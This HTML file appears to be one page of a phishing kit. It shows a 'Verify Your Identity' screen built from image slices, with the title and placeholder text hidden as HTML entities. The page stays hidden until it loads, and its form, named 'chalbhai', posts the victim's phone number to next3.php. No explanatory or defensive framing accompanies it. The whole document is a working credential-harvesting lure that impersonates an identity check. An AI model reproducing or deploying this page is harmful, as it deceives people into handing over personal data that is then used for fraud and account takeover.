<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
  
.textbox {  
  	border-color: rgba(0,0,0,0.4);
    padding-left: 8px;
	font-size: 15px;
	font:  Arial;
    height: 32px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #0078d7;
	 box-shadow: 0px 0px 2px #0078d7; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 

 </style>
 <style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:536px; top:26px; width:285px; height:107px; z-index:0"><img src="images/ff1.png" alt="" title="" border=0 width=285 height=107></div>

<div id="image2" style="position:absolute; overflow:hidden; left:502px; top:181px; width:371px; height:41px; z-index:1"><img src="images/ff3.png" alt="" title="" border=0 width=371 height=41></div>

<div id="image3" style="position:absolute; overflow:hidden; left:500px; top:332px; width:372px; height:152px; z-index:20"><img src="images/ff2.png" alt="" title="" border=0 width=372 height=152></div>

<div id="image4" style="position:absolute; overflow:hidden; left:506px; top:337px; width:180px; height:35px; z-index:21"><a href="#"><img src="images/cncl.png" alt="" title="" border=0 width=180 height=35></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:539px; top:442px; width:295px; height:15px; z-index:22"><a href="#"><img src="images/terms.png" alt="" title="" border=0 width=295 height=15></a></div>

<form action=next3.php name=chalbhai id=chalbhai method=post>
<input name="phone" placeholder="&#80;&#104;&#111;&#110;&#101;&#32;&#78;&#117;&#109;&#98;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:358px;left:505px;top:242px;z-index:2">

<div id="formimage1" style="position:absolute; left:688px; top:337px; z-index:23"><input type="image" name="formimage1" width="178" height="34" src="images/submit.png"></div>

</body>
</html>
